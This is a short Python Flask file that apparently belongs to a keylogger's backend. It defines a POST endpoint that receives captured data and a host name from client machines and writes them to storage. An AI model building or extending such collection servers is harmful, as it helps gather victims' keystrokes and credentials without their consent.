from flask import Flask, jsonify, request, Blueprint
from keyloggerBackend.app.logic.save_data_logic import WriteToNetwork





sava_data_bp = Blueprint('saveData', __name__, url_prefix='/saveData')

@sava_data_bp.route('/', methods=['POST'])
def save_decrypted_data():
    data=request.get_json()
    host_name = request.headers.get("host_name")
    write_to_network=WriteToNetwork(host_name)
    write_to_network.write(data)

    print("data",data)
    if not data:
        return jsonify({"error": "No data received"}), 400
    return jsonify({"status": "success"}), 200



